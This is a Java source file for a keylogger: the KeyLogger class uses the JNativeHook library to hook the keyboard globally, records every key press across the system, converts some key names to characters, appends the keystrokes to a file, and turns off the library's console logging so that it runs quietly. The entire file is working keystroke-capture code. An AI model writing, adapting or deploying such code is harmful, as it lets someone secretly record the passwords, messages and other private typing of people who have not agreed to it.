package Main;

import java.util.logging.Logger;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {
	
	private String textEntered;
	private FileHandler fileHandler;
	
	public KeyLogger() {
		textEntered = new String();
		fileHandler = FileHandler.getInstance();
	}

    public static void main(String[] args) {
    	KeyLogger keyLogger = new KeyLogger();
    	
        keyLogger.createFile();
    	
        try {
            GlobalScreen.registerNativeHook();
        } 
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
        keyLogger.disableConsoleLogger();
    }
    
    public void createFile() {
    	fileHandler.createNewFile();
    }

	@Override
	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
		String convertedKey = convertKey(keyPressed);
		
		textEntered.concat(convertedKey);
		fileHandler.appendToFile(convertedKey);
	}
	
	public String convertKey(String keyPressed){
		switch(keyPressed) {
			case "Space" :
				keyPressed = " ";
				break;
			case "Period" :
				keyPressed = ".";
				break;
			case "Comma" :
				keyPressed = ",";
				break;
			case "Backspace" :
				keyPressed = "";
				break;
			case "Shift" :
				keyPressed = "";
				break;
			case " Ctrl " :
				keyPressed = "";
				break;
		}
		return keyPressed;
	}
	
    public void disableConsoleLogger() {
    	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);
    }

	@Override
	public void nativeKeyReleased(NativeKeyEvent keyEvent) {}

	@Override
	public void nativeKeyTyped(NativeKeyEvent keyEvent) {}
}



